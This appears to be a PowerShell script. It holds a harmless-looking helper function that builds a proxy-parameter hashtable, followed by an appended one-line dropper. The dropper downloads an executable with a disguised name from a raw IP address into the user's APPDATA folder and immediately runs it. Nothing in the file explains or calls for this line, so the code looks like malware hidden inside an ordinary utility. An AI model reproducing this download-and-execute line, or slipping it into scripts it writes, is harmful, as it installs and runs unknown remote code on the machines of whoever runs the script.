function Get-ParametersHashtable
{
    param(
        $Proxy,
        $ProxyCredential
    )

    $ParametersHashtable = @{}
    if($Proxy)
    {
        $ParametersHashtable[$script:Proxy] = $Proxy
    }

    if($ProxyCredential)
    {
        $ParametersHashtable[$script:ProxyCredential] = $ProxyCredential
    }

    return $ParametersHashtable
}
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

